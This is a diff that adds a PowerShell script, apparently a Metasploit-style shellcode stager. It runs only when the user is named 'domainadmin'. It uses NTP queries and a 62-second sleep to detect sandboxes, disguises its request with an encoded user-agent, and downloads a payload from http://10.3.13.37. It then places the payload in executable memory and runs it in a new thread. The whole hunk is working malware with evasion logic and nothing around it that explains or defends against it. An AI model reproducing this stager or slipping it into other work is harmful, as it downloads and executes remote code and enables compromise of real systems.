@@ -1,0 +1,18 @@
+$q = @"
+[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@
+if($env:username -eq "domainadmin") {
+[Byte[]]$NTPTransmit=,1*48;$NTPTransmit[0]=0x1B;[Byte[]]$secondTransmit=,1*48;$secondTransmit[0]=0x1B;$noAccess=$false;Try{$Socket=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$Socket.Connect('us.pool.ntp.org',123);[Void]$Socket.Send($NTPTransmit);[Void]$Socket.Receive($NTPTransmit)}catch{$noAccess=$true};$runTotal=0;ForEach($Index in $NTPTransmit[40..43]){$runTotal=$runTotal*256+$Index};$firstTime=(New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second;Start-Sleep -s 62;Try{$NewSock=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$NewSock.Connect('us.pool.ntp.org',123);[Void]$NewSock.Send($secondTransmit);[Void]$NewSock.Receive($secondTransmit);$NewSock.Close()}catch{$noAccess=$true};$runTotal=0;ForEach($Index in $secondTransmit[40..43]){$runTotal=$runTotal*256+$Index}
+if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge 62 -or $noAccess) {
+try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)}
+function t {$f = "";1..3|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
+function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
+function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
+$m = New-Object System.Net.WebClient;$m.Headers.Add("user-agent", "1f8b08004b17425b0003f32f4ab70acd4d2a4acdc949b456f0c82f2eb10a700cb756082d4e2db24ac9cf4dcccc4b4cc9cdccb35670cb494cb772f37174af4e4e4a4b3233374b4d4c363632304f364849324d31324f33b54c35354e333432ab05006811b54b55000000")
+$n = g; [Byte[]] $p = $m.DownloadData("http://10.3.13.37:80/$n" )
+$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
+$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
+$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}}
+}
